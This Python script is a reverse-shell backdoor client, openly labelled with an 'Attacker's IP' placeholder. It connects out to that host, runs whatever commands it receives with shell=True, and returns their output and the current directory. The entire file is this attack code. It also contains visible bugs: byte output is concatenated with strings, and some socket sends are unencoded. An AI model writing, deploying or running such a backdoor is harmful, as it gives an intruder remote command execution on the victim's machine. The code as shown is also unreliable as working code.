import socket
import subprocess
import os

HOST = "000.000.000.000" # Attacker's IP
PORT = 1234
BUFFER = 4096
SEP = "<sep>"
error_outputs = ["Invalid command", "No such file or directory"]

def shell():
    while True:
        try:
            command = client_socket.recv(BUFFER).decode()
            split_command = command.split()
            is_empty = not command.strip()

            if is_empty:
                output = error_outputs[0]
                cwd = os.getcwd()
                message = output + SEP + cwd
                client_socket.send(message.encode())
                continue
            elif split_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(split_command[1:]))
                    output = ""
                except FileNotFoundError as exception:
                    output = str(exception)
                except IndexError:
                    output = error_outputs[1]
            elif command.lower() in ['exit', 'quit', 'q', 'close', 'shutdown', 'bye', 'goodbye']:
                client_socket.close()
                break
            else:
                try:
                    process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE,
                                               stderr = subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    if stdout:
                        output = stdout
                    else:
                        output = stderr
                except Exception as exception:
                    output = str(exception)

            cwd = os.getcwd()
            message = output + SEP + cwd
            client_socket.send(message)

        except Exception as exception:
            print("Error: %s" % exception)
            break


def main():
    global client_socket
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        cwd = os.getcwd()
        client_socket.send(cwd)
        shell()

    except Exception as exception:
        print("Connection error: %s" % exception)
    finally:
        client_socket.close()


if __name__ == "__main__":
    main()
